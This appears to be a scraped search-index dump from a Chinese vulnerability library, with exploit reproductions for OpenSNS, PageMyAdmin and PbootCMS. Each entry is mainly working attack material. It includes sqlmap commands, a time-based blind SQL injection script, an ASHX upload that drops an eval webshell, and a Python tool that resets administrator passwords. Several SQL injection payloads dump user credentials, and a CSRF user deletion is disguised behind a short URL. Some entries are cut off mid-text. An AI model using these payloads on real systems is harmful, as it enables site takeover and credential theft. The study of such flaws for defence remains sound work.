OpenSNS采用thinkphp框架编写。系统的设计遵循高内聚低耦合，允许管理员自由开启关闭功能模块。不仅如此，OpenSNS还内置了一个功能扩展商店，可以一键在线安装新的功能扩展。 OpenSNS目前有大量的国内开发者，云市场也上架了大量的第三方功能模块和主题应用，使OpenSNS可以同时满足各行各业的社交需求。 二、漏洞影响 三、复现过程 SQL注入(一) 需要注册一个账号并登录 sqlmap.py -u \"http://localhost/index.php?s=/ucenter/Config/&uid=1*\" --cookie \" PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136\" --batch --technique=T --dbms \"mysql\" sqlmap.py -u \"http://localhost/index.php?s=/ucenter/Config/&uid=1*\" --cookie \" PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136\" --batch --technique=T --dbms \"mysql\" --is-dba sqlmap.py -u \"http://localhost/index.php?s=/ucenter/Config/&uid=1*\" --cookie \" PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136\" --batch --technique=T --dbms \"mysql\" --current-db 同类h注入点 http://0-sec.org/index.php?s=/ucenter/index/index&uid=10 http://0-sec.org/index.php?s=/ucenter/index/information&uid=10 SQL注入(二) 需要注册一个账号并登录 sqlmap.py -u \"http://localhost/index.php?s=/ucenter/index/getExpandInfo&uid=1)*--+\" --cookie \"PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136;opensns_OX_LOGGED_USER=HYnkRzJxTkdgAdhKfVfkJ8n4kjemH%3DgWJU16IaiiFhglB7nm66fAxbZ9TTZXz%3DWWqjeQ5%3Di4bjZITf04G20E4v35V135D8miM5F2Jzf6VkgkYymtohawe\" --dbms \"mysql\" --batch sqlmap.py -u \"http://localhost/index.php?s=/ucenter/index/getExpandInfo&uid=1)*--+\" --cookie \"PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136;opensns_OX_LOGGED_USER=HYnkRzJxTkdgAdhKfVfkJ8n4kjemH%3DgWJU16IaiiFhglB7nm66fAxbZ9TTZXz%3DWWqjeQ5%3Di4bjZITf04G20E4v35V135D8miM5F2Jzf6VkgkYymtohawe\" --dbms \"mysql\" --batch --is-dba sqlmap.py -u \"http://localhost/index.php?s=/ucenter/index/getExpandInfo&uid=1)*--+\" --cookie \"PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136;opensns_OX_LOGGED_USER=HYnkRzJxTkdgAdhKfVfkJ8n4kjemH%3DgWJU16IaiiFhglB7nm66fAxbZ9TTZXz%3DWWqjeQ5%3Di4bjZITf04G20E4v35V135D8miM5F2Jzf6VkgkYymtohawe\" --dbms \"mysql\" --batch --current-db 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-22 14:42:21 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/OpenSNS/2.html":{"url":"0day/OpenSNS/2.html","title":"OpenSNS 后台getshell","keywords":"","body":"OpenSNS 后台getshell 一、漏洞简介 二、漏洞影响 三、复现过程 1. 打开网站后台找到模板上传位置： http://www.0-sec.org/index.php?s=/admin/theme/add.html 2. 配置一个压缩包，压缩包里是一句话木马： 3. 选择上传： 4、会在./Theme目录下自动生成刚刚上传好的马儿 http://www.0-sec.org/Theme/shell.php 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 17:55:38 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/OpenSNS/3.html":{"url":"0day/OpenSNS/3.html","title":"OpenSNS v6.1.0 前台sql注入","keywords":"","body":"OpenSNS v6.1.0 前台sql注入 一、漏洞简介 二、漏洞影响 OpenSNS v6.1.0 三、复现过程 vul url http://0-sec.org/uploads_download_2019-07-16_5d2d5d4697d88/index.php?s=/home/addons/_addons/china_city/_controller/china_city/_action/getcity.html poc POST /index.php?s=%2Fhome%2Faddons%2F_addons%2Fchina_city%2F_controller%2Fchina_city%2F_action%2Fgetcity.html HTTP/1.1 Host: 0-sec.org User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 Content-Length: 116 Accept: */* Cookie: Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,und;q=0.7 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://192.168.95.131 Referer: http://192.168.95.131/uploads_download_2019-07-16_5d2d5d4697d88/index.php?s=/ucenter/config/index.html X-Requested-With: XMLHttpRequest Accept-Encoding: gzip cid=0&pid%5B0%5D=%3D%28select%2Afrom%28select%2Bsleep%283%29union%2F%2A%2A%2Fselect%2B1%29a%29and+3+in+&pid%5B1%5D=3 Vulnerability file Addons/ChinaCity/Controller/ChinaCityController.class.php:50 ThinkPHP/Library/Think/Db.class.php:772 exp import requests from requests import exceptions url=\"http://192.168.95.131/uploads_download_2019-07-16_5d2d5d4697d88/index.php?s=/home/addons/_addons/china_city/_controller/china_city/_action/getcity.html\" header={'X-Requested-With':'XMLHttpRequest'} # proxies={'http':'127.0.0.1:8080'} flag='' for i in range(1,50): for j in range(32,128): try: data={ 'cid':0, 'pid[0]':\"=(select if(ord(substr((select version()),{},1))={},sleep(10),0))AND 3 IN \".format(i,j), 'pid[1]':3 } # print data['pid[0]'] r=requests.post(url,data=data,headers=header,timeout=5) except exceptions.Timeout : flag+=chr(j) print flag 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 17:49:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/PageMyAdmin/PageMyAdmin文件上传getshell.html":{"url":"0day/PageMyAdmin/PageMyAdmin文件上传getshell.html","title":"PageMyAdmin文件上传getshell","keywords":"","body":"PageMyAdmin文件上传getshell 一、漏洞简介 二、漏洞影响 三、复现过程 先set增加ashx白名单-> POST /e/aspx/upload.aspx?a=pageadmin_cms HTTP/1.1 Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */* Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.9 Safari/537.36 Cookie: ASP.NET_SessionId=c53k11452napjc45ibfuaw55 Referer: http://www.0-sec.org/e/aspx/upload.aspx?a=pageadmin_cms Host: www.0-sec.org Content-Length: 106 Connection: Keep-Alive submit=1&swf_upload=2&table=pa_field&field=file_ext=\".jpg,.jpeg,.gif,.bmp,.ashx\" where id=174 and max_num 返回包 HTTP/1.1 200 OK Cache-Control: private Content-Length: 72 Content-Type: text/html; charset=utf-8 Server: Microsoft-IIS/7.5 X-AspNet-Version: 2.0.50727 Date: Sat, 13 Jul 2019 07:52:02 GMT location.href='?result=cs_error' 第二步 在上传ashx-> POST /e/aspx/upload.aspx HTTP/1.1 Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */* Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzBItOAbA8GrZ7s49 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.9 Safari/537.36 Cookie: ASP.NET_SessionId=c53k11452napjc45ibfuaw55 Referer: http://www.0-sec.org/e/aspx/upload_p ... pic&from=master Host: www.0-sec.org Content-Length: 2318 ------WebKitFormBoundaryzBItOAbA8GrZ7s49 Content-Disposition: form-data; name=\"file\"; filename=\"005.ashx\" Content-Type: image/jpeg using System; using System.Web; using System.IO; public class Handler : IHttpHandler { public bool IsReusable { get { return false; } } public void ProcessRequest(HttpContext context) { byte[] b={0x3C, 0x25, 0x40, 0x20, 0x50, 0x61, 0x67, 0x65, 0x20, 0x4C, 0x61, 0x6E, 0x67, 0x75, 0x61, 0x67, 0x65, 0x3D, 0x22, 0x4A, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x22, 0x25, 0x3E, 0x3C, 0x25, 0x65, 0x76, 0x61, 0x6C, 0x28, 0x52, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x2E, 0x49, 0x74, 0x65, 0x6D, 0x5B, 0x22, 0x70, 0x61, 0x73, 0x73, 0x22, 0x5D, 0x2C, 0x22, 0x75, 0x6E, 0x73, 0x61, 0x66, 0x65, 0x22, 0x29, 0x3B, 0x25, 0x3E}; try { File.WriteAllBytes(context.Server.MapPath(\"/e/upload/s1/article/file/\")+\"/file.aspx\",b); context.Response.Write(\"oooooooookkkkkkkkk\"); } catch(Exception ex) { context.Response.Write(ex.Message); } context.Response.End(); } } ------WebKitFormBoundaryzBItOAbA8GrZ7s49 Content-Disposition: form-data; name=\"width\" 400 ------WebKitFormBoundaryzBItOAbA8GrZ7s49 Content-Disposition: form-data; name=\"height\" 400 ------WebKitFormBoundaryzBItOAbA8GrZ7s49 Content-Disposition: form-data; name=\"url\" ------WebKitFormBoundaryzBItOAbA8GrZ7s49 Content-Disposition: form-data; name=\"filesize\" 0 ------WebKitFormBoundaryzBItOAbA8GrZ7s49 Content-Disposition: form-data; name=\"username\" admin ------WebKitFormBoundaryzBItOAbA8GrZ7s49 Content-Disposition: form-data; name=\"sid\" 1 ------WebKitFormBoundaryzBItOAbA8GrZ7s49 Content-Disposition: form-data; name=\"type\" file ------WebKitFormBoundaryzBItOAbA8GrZ7s49 Content-Disposition: form-data; name=\"table\" article ------WebKitFormBoundaryzBItOAbA8GrZ7s49 Content-Disposition: form-data; name=\"field\" titlepic ------WebKitFormBoundaryzBItOAbA8GrZ7s49 Content-Disposition: form-data; name=\"from\" master ------WebKitFormBoundaryzBItOAbA8GrZ7s49 Content-Disposition: form-data; name=\"submit\" 1 ------WebKitFormBoundaryzBItOAbA8GrZ7s49-- 发送第二步返回shell 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 18:25:48 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/PageMyAdmin/PageMyAdmin sql注入漏洞.html":{"url":"0day/PageMyAdmin/PageMyAdmin sql注入漏洞.html","title":"PageMyAdmin sql注入漏洞","keywords":"","body":"PageMyAdmin sql注入漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 poc #!/usr/bin/env python # -*- coding: utf-8 -*- import urllib2 import urllib import re import sys def main(): url=sys.argv[1]+\"/e/aspx/post.aspx\" fun=sys.argv[2] if fun=='upass': update(url) elif fun=='sqlinject': sqlinject(url) elif fun=='Backstage': Backstage(url) else: print''' usage: pageadminsql.py http://www.baidu.com/ upass parameter: uppass sqlinject Backstage ''' def update(url): headers = {\"User-Agent\":\"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\",\"Referer\":url+\"?a=pageadmin_cms\"} formate={ \"siteid\":\"1\", \"formtable\":\"1\", \"thedata\":'[u][k]pa_member[k][s][k]userpassword=\"1527f10a11de5efea4b8516213413c103df55126\"[k]where[k]id=2' } postdata = urllib.urlencode(formate) request = urllib2.Request(url, data=postdata, headers = headers) try: response = urllib2.urlopen(request) if response.getcode()==200: print u\">>>>>>修改密码成功 修改密码：admin_1234213>>>>>修改密码失败>>>>>密码注入成功 查看密码地址：{0}/index.aspx?lanmuid=63&sublanmuid=654&id=747>>>>>密码注入失败>>>>>后台地址注入成功 查看后台地址：{0}/index.aspx?lanmuid=63&sublanmuid=654&id=747>>>>>后台地址注入失败零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-20 23:40:15 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/PbootCMS/1.html":{"url":"0day/PbootCMS/1.html","title":"PbootCMS sql注入","keywords":"","body":"PbootCMS sql注入 0x01 前台home模块注入漏洞 0x01.1 在线留言处insert sql注入 0x01.1.2 漏洞演示 注：我本地测试的所以我把验证验证码那一步关闭了=-=，实战中请自己加上验证码 url:http://127.0.0.1/cms/PbootCMS-V1.2.1/index.php/Message/add post: contacts[content`,`create_time`,`update_time`) VALUES ('1', '1' ,1 and updatexml(1,concat(0x3a,user()),1) );-- a] = 1111 content = 1111 mobile = 1111 0x01.1.2 漏洞解读 路径：PbootCMS-V1.2.1\\apps\\home\\controller\\MessageController.php 方法：add( // 留言新增 public function add() { if ($_POST) { if (time() - session('lastsub') config('message_check_code')) { // if (! $checkcode) { // alert_back('验证码不能为空！'); // } if ($checkcode != session('checkcode')) { alert_back('验证码错误！'); } } // 读取字段 if (! $form = $this->model->getFormField(1)) { alert_back('留言表单不存在任何字段，请核对后重试！'); } // 接收数据 $mail_body = ''; foreach ($form as $value) { $field_data = post($value->name); if (is_array($field_data)) { // 如果是多选等情况时转换 $field_data = implode(',', $field_data); } if ($value->required && ! $field_data) { alert_back($value->description . '不能为空！'); } else { $data[$value->name] = post($value->name); $mail_body .= $value->description . '：' . post($value->name) . ''; } } // 设置额外数据 if ($data) { $data['acode'] = session('lg'); $data['user_ip'] = ip2long(get_user_ip()); $data['user_os'] = get_user_os(); $data['user_bs'] = get_user_bs(); $data['recontent'] = ''; $data['status'] = 0; $data['create_user'] = 'guest'; $data['update_user'] = 'guest'; } if ($this->model->addMessage($data)) { session('lastsub', time()); // 记录最后提交时间 $this->log('留言提交成功！'); if ($this->config('message_send_mail') && $this->config('message_send_to')) { $mail_subject = \"【PbootCMS】您有新的表单数据，请注意查收！\"; $mail_body .= '来自网站' . get_http_url() . '（' . date('Y-m-d H:i:s') . '）'; sendmail($this->config(), $this->config('message_send_to'), $mail_subject, $mail_body); } alert_location('提交成功！', '-1'); } else { $this->log('留言提交失败！'); alert_back('提交失败！'); } } else { error('提交失败，请使用POST方式提交！'); } } 可以看到，整个逻辑下来的意思就是说，查询出数据库一条数据，然后接收外部 POST 内容，只匹配数据库的字段，相同才会拼接到 $_data数组 然后就会带入 $this->model->addMessage(data) 执行语句 路径：PbootCMS-V1.2.1\\apps\\home\\model\\ParserModel.php 方法：addMessage( // 新增留言 public function addMessage($data) { return parent::table('ay_message')->autoTime()->insert($data); } 根据6.0可以看到带入了进入了 insert 那么我们传的二维数组刚好可以控制key 带入数据库查询引发注入 0x01.2 免费通话insert sql注入 注：本地测试的时候，这个地方的注入需要后台添加一条数据才能注！真实环境的话，开放了这个功能直接抓包即可 进入后台 0x08.2.1 漏洞演示 url：http://127.0.0.1/cms/PbootCMS-V1.2.1/index.php/Form/add?fcode=2 post： tel[tel`) VALUES ( 1 and updatexml(1,concat(0x3a,user()),1) );-- a] = 1111 0x08.2.2 漏洞解读 路径：PbootCMS-V1.2.1\\apps\\home\\controller\\FormController.php 方法：add( // 表单提交 public function add() { if ($_POST) { if (time() - session('lastsub') config('message_check_code')) { * if (! $checkcode) { * alert_back('验证码不能为空！'); * } * if ($checkcode != session('checkcode')) { * alert_back('验证码错误！'); * } * } */ // 读取字段 if (! $form = $this->model->getFormField($fcode)) { alert_back('接收表单不存在任何字段，请核对后重试！'); } // 接收数据 $mail_body = ''; foreach ($form as $value) { $field_data = post($value->name); if (is_array($field_data)) { // 如果是多选等情况时转换 $field_data = implode(',', $field_data); } if ($value->required && ! $field_data) { alert_back($value->description . '不能为空！'); } else { $data[$value->name] = post($value->name); $mail_body .= $value->description . '：' . post($value->name) . ''; } } // 设置创建时间 if ($data) { $data['create_time'] = get_datetime(); } // 写入数据 if ($this->model->addForm($value->table_name, $data)) { session('lastsub', time()); // 记录最后提交时间 $this->log('提交表单数据成功！'); if ($this->config('message_send_mail') && $this->config('message_send_to')) { $mail_subject = \"【PbootCMS】您有新的表单数据，请注意查收！\"; $mail_body .= '来自网站' . get_http_url() . '（' . date('Y-m-d H:i:s') . '）'; sendmail($this->config(), $this->config('message_send_to'), $mail_subject, $mail_body); } alert_location('提交成功！', '-1'); } else { $this->log('提交表单数据失败！'); alert_back('提交失败！'); } } else { error('提交失败，请使用POST方式提交！'); } } 可以看到，整个逻辑下来的意思就是说，查询出数据库一条数据，然后接收外部 POST 内容，只匹配数据库的字段，相同才会拼接到 $_data数组 然后就会带入 $this->model->addForm($value->table_name, $data) 执行语句 路径：PbootCMS-V1.2.1\\apps\\home\\model\\ParserModel.php public function addForm($table, $data) { return parent::table($table)->insert($data); } 根据6.0可以看到带入了进入了 insert 那么我们传的二维数组刚好可以控制key 带入数据库查询引发注入. 0X01.3 前台首页注入 0x08.3.1 漏洞演示 url: http://127.0.0.1/cms/PbootCMS-V1.2.1/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123 0x01.3.2 漏洞解读 文件地址：PbootCMS-V1.2.1\\apps\\home\\controller\\ParserController.php 方法：index( // 首页 骚操作 注入 // parserAfter -> parserSpecifyListLabel public function index() { $content = parent::parser('index.html'); // 框架标签解析 $content = $this->parser->parserBefore($content); // CMS公共标签前置解析 $content = $this->parser->parserPositionLabel($content, - 1, '首页', SITE_DIR . '/'); // CMS当前位置标签解析 $content = $this->parser->parserSpecialPageSortLabel($content, 0, '', SITE_DIR . '/'); // 解析分类标签 $content = $this->parser->parserAfter($content); // CMS公共标签后置解析 $this->cache($content, true); } 文件地址：apps\\home\\controller\\ParserController.php 方法：parserAfter() 跟进 $content = $this->parser->parserAfter($content); 这个方法 // 解析全局后置公共标签 public function parserAfter($content) { ... $content = $this->parserSpecifyListLabel($content); // 指定列表 return $content; } 方法：parserSpecifyListLabel( 进入以后 查看调用了 $content = $this->parserSpecifyListLabel($content); 方法 // 解析指定分类列表标签 public function parserSpecifyListLabel($content) { ... // 数据筛选 骚操作注入 $where2 = array(); foreach ($_GET as $key => $value) { if (substr($key, 0, 4) == 'ext_') { // 其他字段不加入 $where2[$key] = get($key); } } ... // 读取数据 if ($page) { $data = $this->model->getList($scode, $num, $order, $where1, $where2); } else { $data = $this->model->getSpecifyList($scode, $num, $order, $where1, $where2); } } 这里就将重要的方法分析一下了，其他无关的就删除掉避免影响阅读。 这里接收了外部了外部所有的get参数然后判断了开头的前4个字符是否 ext_ 开头，如果符合就直接拼接进入$where2这个数组 然后带入数据库进行getList方法与getSpecifyList查询，而底层是字符串拼接，过滤了value没有过滤key所以有注入 0x08.4 前台搜索框注入 0x08.4.1 漏洞利用 url:http://127.0.0.1/cms/PbootCMS-V1.2.1/index.php/Search/index?keyword=aaaa&updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123 0x08.4.2 漏洞讲解 文件地址：PbootCMS-V1.2.1\\apps\\home\\controller\\SearchController.php 方法：index() // 骚操作 注入 // parserSearchLabel public function index() { $content = parent::parser('search.html'); // 框架标签解析 $content = $this->parser->parserBefore($content); // CMS公共标签前置解析 $content = $this->parser->parserPositionLabel($content, 0, '搜索', url('/home/Search/index')); // CMS当前位置标签解析 $content = $this->parser->parserSpecialPageSortLabel($content, 0, '搜索结果', url('/home/Search/index')); // 解析分类标签 $content = $this->parser->parserSearchLabel($content); // 搜索结果标签 $content = $this->parser->parserAfter($content); // CMS公共标签后置解析 $this->cache($content, true); } 文件地址：apps\\home\\controller\\ParserController.php 方法：parserSearchLabel( 进入以后 查看调用了 $content = $this->parser->parserSearchLabel($content); 方法 // 解析内容搜索结果标签 public function parserSearchLabel($content) { ... foreach ($_GET as $key => $value) { if (! ! $value = get($key, 'vars')) { $where2[$key] = $value; } } ... // 读取数据 if (! $data = $this->model->getList($scode, $num, $order, $where1, $where2, $fuzzy)) { $content = str_replace($matches[0][$i], '', $content); continue; } } 这里就将重要的方法分析一下了，其他无关的就删除掉避免影响阅读。 这里接收了外部了外部所有的get参数然后就直接拼接进入$where2这个数组 然后带入数据库进行getList方法查询，而底层是字符串拼接，过滤了value没有过滤key所以有注入 0x10 api模块注入 api模块的注入需要后端开启api功能，并且获得 api_appid 与 api_secret 才能注入。 或是说 开启了api功能并且关闭了API强制认证 这样也可以注入 所以较鸡助 0x10.1 接口注入一 0x10.1.1 漏洞演示 url:http://127.0.0.1/cms/PbootCMS-V1.2.1/api.php/cms/search?1%3D1)and(updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1))--=1 post： 11=11 一定要post 要跑空post才能进流程 因为系统中会把 “空格”转为“_” 所以使用/**/绕过即可 0x10.1.2 漏洞讲解 路径：apps\\api\\controller\\CmsController.php 方法：search( 这里我把漏洞触发点发出来我们主要讲讲他即可 // 数据接收 foreach ($_GET as $key => $value) { if (! ! $value = get($key, 'vars')) { $where[$key] = $value; } } $data = $this->model->getList($acode, $scode, $num, $order, $where, $fuzzy); 从代码中看他会收集外部所有的 $_GET 带入 getList 进行入库查询 value 是我们无法控制所以无法注入的，可是key是我们可控制可注入的！！！跟进 getList方法 路径：PbootCMS-V1.2.1\\apps\\api\\model\\CmsModel.php function getList( // 列表内容 public function getList($acode, $scode, $num, $order, $where = array(), $fuzzy = true) { ... // 筛选条件支持模糊匹配 return parent::table('ay_content a')->field($fields) ->where($where1, 'OR') ->where($where2) ->where($where, 'AND', 'AND', $fuzzy) ->join($join) ->order($order) ->page(1, $num) ->decode() ->select(); } 这里我把关键代码放出来了，可以看到接收$where以后直接仍进了数据库进行操作造成了注入 0x10.2 接口注入二 0x10.2.1 漏洞利用 url：http://127.0.0.1/cms/PbootCMS-V1.2.1/api.php/cms/addmsg post: contacts[contentl`) VALUES ( updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1) );-- a] = 111 mobile = 111 content = 111 0x10.2.2 漏洞讲解 文件：PbootCMS-V1.2.1\\apps\\api\\controller\\CmsController.php 方法：addmsg( // 新增留言 注入 public function addmsg() { if ($_POST) { // 读取字段 if (! $form = $this->model->getFormField(1)) { json(0, '接收表单不存在任何字段，请核对后重试！'); } // 接收数据 $mail_body = ''; foreach ($form as $value) { $field_data = post($value->name); if ($value->required && ! $field_data) { json(0, $value->description . '不能为空！'); } else { $data[$value->name] = post($value->name); $mail_body .= $value->description . '：' . post($value->name) . ''; } } // 设置其他字段 if ($data) { $data['acode'] = get('acode', 'var') ?: $this->lg; $data['user_ip'] = ip2long(get_user_ip()); $data['user_os'] = get_user_os(); $data['user_bs'] = get_user_bs(); $data['recontent'] = ''; $data['status'] = 0; $data['create_user'] = 'api'; $data['update_user'] = 'api'; } // 写入数据 if ($this->model->addMessage($value->table_name, $data)) { $this->log('API提交表单数据成功！'); if ($this->config('message_send_mail') && $this->config('message_send_to')) { $mail_subject = \"【PbootCMS】您有新的表单数据，请注意查收！\"; $mail_body .= '来自网站' . get_http_url() . '（' . date('Y-m-d H:i:s') . '）'; sendmail($this->config(), $this->config('message_send_to'), $mail_subject, $mail_body); } json(1, '表单提交成功！'); } else { $this->log('API提交表单数据失败！'); json(0, '表单提交失败！'); } } else { json(0, '表单提交失败，请使用POST方式提交！'); } } 可以看到，整个逻辑下来的意思就是说，查询出数据库一条数据，然后接收外部 POST 内容，只匹配数据库的字段，相同才会拼接到 $_data数组 然后就会带入 $this->model->addMessage(data) 执行语句 文件：PbootCMS-V1.2.1\\apps\\api\\model\\CmsModel.php 函数：addMessage( // 新增留言 public function addMessage($table, $data) { return parent::table('ay_message')->autoTime()->insert($data); } 根据6.0可以看到带入了进入了 insert 那么我们传的二维数组刚好可以控制key 带入数据库查询引发注入 0x10.3 接口注入三 0x10.3.1 漏洞利用 url：http://127.0.0.1/cms/PbootCMS-V1.2.1/api.php/cms/addform?fcode=1 post: contacts[content`) VALUES ( updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1) );-- a] = 111 mobile = 111 content = 123 0x10.3.2 漏洞讲解 // 表单提交 注入 public function addform() { if ($_POST) { if (! $fcode = get('fcode', 'var')) { json(0, '传递的表单编码fcode有误！'); } // 读取字段 if (! $form = $this->model->getFormField($fcode)) { json(0, '接收表单不存在任何字段，请核对后重试！'); } // 接收数据 $mail_body = ''; foreach ($form as $value) { $field_data = post($value->name); if ($value->required && ! $field_data) { json(0, $value->description . '不能为空！'); } else { $data[$value->name] = post($value->name); $mail_body .= $value->description . '：' . post($value->name) . ''; } } // 设置创建时间 if ($data) { $data['create_time'] = get_datetime(); } // 写入数据 if ($this->model->addForm($value->table_name, $data)) { $this->log('API提交表单数据成功！'); if ($this->config('message_send_mail') && $this->config('message_send_to')) { $mail_subject = \"【PbootCMS】您有新的表单数据，请注意查收！\"; $mail_body .= '来自网站' . get_http_url() . '（' . date('Y-m-d H:i:s') . '）'; sendmail($this->config(), $this->config('message_send_to'), $mail_subject, $mail_body); } json(1, '表单提交成功！'); } else { $this->log('API提交表单数据失败！'); json(0, '表单提交失败！'); } } else { json(0, '表单提交失败，请使用POST方式提交！'); } } 可以看到，整个逻辑下来的意思就是说，查询出数据库一条数据，然后接收外部 POST 内容，只匹配数据库的字段，相同才会拼接到 $_data数组 然后就会带入 $this->model->addForm(data) 执行语句 文件：PbootCMS-V1.2.1\\apps\\api\\model\\CmsModel.php 方法：addForm( // 新增表单数据 public function addForm($table, $data) { return parent::table($table)->insert($data); } 根据6.0可以看到带入了进入了 insert 那么我们传的二维数组刚好可以控制key 带入数据库查询引发注入 四、参考链接 https://www.yuque.com/pmiaowu/bfgkkh/lrqvqv 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-14 14:34:18 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/PbootCMS/2.html":{"url":"0day/PbootCMS/2.html","title":"PbootCMS csrf","keywords":"","body":"PbootCMS csrf 一、漏洞简介 二、漏洞影响 三、复现过程 我将网站建立在本地，本来想测试添加用户的操作，但是发现这里有formcheck验证，所以失败了 然后我想到了删除用户位置，首先我使用管理员账号登陆，在删除用户的操作时抓包。发现很简单。只有一个id来判断删除哪个用户 于是我直接构造一个新的url，http://127.0.0.1/cve/p/admin.php/User/del/ucode/10004（上面是10003） 确认这个用户是存在的。然后访问http://127.0.0.1/cve/p/admin.php/User/del/ucode/10004 删除成功 但是这样很容易被熟悉的管理员识别，我们可以利用段网站来进行攻击。 短网址生成网站https://www.ft12.com/ http://127.0.0.1/cve/p/admin.php/User/del/ucode/10004 可以缩短为http://u6.gg/gPCcN 访问这个短网址，也可以变为http://127.0.0.1/cve/p/admin.php/User/del/ucode/10004触发漏洞 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-21 21:45:11 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/PbootCMS/CVE-2018-16356.html":{"url":"0day/PbootCMS/CVE-2018-16356.html","title":"（CVE-2018-16356）PbootCMS sql注入漏洞","keywords":"","body":"（CVE-2018-16356）PbootCMS sql注入漏洞 一、漏洞简介 PbootCMS是一款使用PHP语言开发的开源企业建站内容管理系统（CMS）。 PbootCMS中存在SQL注入漏洞。该漏洞源于基于数据库的应用缺少对外部输入SQL语句的验证。攻击者可利用该漏洞执行非法SQL命令。 二、漏洞影响 三、复现过程 http://www.0-sec.org/api.php/List/index?order=123 $order参数是我们可以控制的 转到函数getList，该参数在函数顺序中使用 再去看function order函数 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-04 12:50:29 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/PbootCMS/CVE-2018-16357.html":{"url":"0day/PbootCMS/CVE-2018-16357.html","title":"（CVE-2018-16357）PbootCMS sql注入漏洞","keywords":"","body":"（CVE-2018-16357）PbootCMS sql注入漏洞 一、漏洞简介 PbootCMS是一款使用PHP语言开发的开源企业建站内容管理系统（CMS）。 PbootCMS中存在SQL注入漏洞。该漏洞源于基于数据库的应用缺少对外部输入SQL语句的验证。攻击者可利用该漏洞执行非法SQL命令。 二、漏洞影响 三、复现过程 http://www.0-sec.org/api.php/Cms/search?#acode=1&num=1&order=1 参数$field是我们可以控制的，去检查函数过滤器 使用函数trim和escape字符串避免sql注入 添加a'会导致mysql语法错误，因此函数escape\\u字符串无效 使用/**/绕过 payload: 